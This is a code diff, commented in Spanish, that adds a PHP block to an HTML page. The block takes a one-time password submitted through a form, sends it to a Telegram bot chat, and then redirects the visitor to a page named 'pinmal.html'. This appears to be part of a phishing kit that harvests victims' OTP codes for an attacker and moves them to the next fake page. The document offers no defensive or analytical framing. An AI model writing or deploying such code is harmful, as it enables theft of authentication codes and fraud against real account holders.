@@ -1,3 +1,36 @@
+<?php
+// Cargar token y chat_id desde settings.php
+require_once "settings.php";
+
+// Recibir código OTP del formulario
+$otp = $_POST['otp_code'] ?? "NO RECIBIDO";
+
+// Construir mensaje
+$mensaje = "🔔 *Nuevo código OTP recibido*\n\n";
+$mensaje .= "Código: *$otp*";
+
+// Enviar a Telegram vía API
+$url = "https://api.telegram.org/bot$token/sendMessage";
+
+$data = [
+    'chat_id' => $chat_id,
+    'text' => $mensaje,
+    'parse_mode' => "Markdown"
+];
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+$result = curl_exec($ch);
+curl_close($ch);
+
+// Luego de enviar puedes redirigir
+header("Location: pinmal.html");
+exit;
+?>
 <!DOCTYPE html>
 <html lang="es">
 <head>
